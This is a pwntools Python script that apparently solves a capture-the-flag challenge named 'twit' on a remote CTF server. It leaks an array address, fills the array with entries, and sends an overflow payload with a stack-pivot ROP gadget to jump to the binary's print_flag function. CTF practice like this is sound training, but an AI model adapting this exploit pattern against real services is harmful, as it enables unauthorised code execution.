from pwn import *
e=context.binary=ELF("./twit",checksec=False)
# p=process("./twit")
p=remote("ctf.asgama.online", 50003)

def add(t,a):
    p.sendlineafter(": ","1")
    p.sendlineafter(": ",t)
    p.sendlineafter(": ",a)

p.sendline("3")
p.recvuntil("memberi: ")
array_addr=int(p.recvline().decode(),16)
print("ini alamat array: ",hex(array_addr))

payload_1=p64(0)
payload_1+=p64(1949)
payload_1+=p64(e.sym.print_flag)

add(payload_1,"a")

for i in range (98):
    add(b"a",b"a")


payload_2=b"a"*124
payload_2+=p64(0x0000000000401196)  # pop rsp ; pop r13 ; pop rdi ; ret
payload_2+=p64(array_addr)
add(b"a",payload_2)
p.sendline("4")
p.interactive()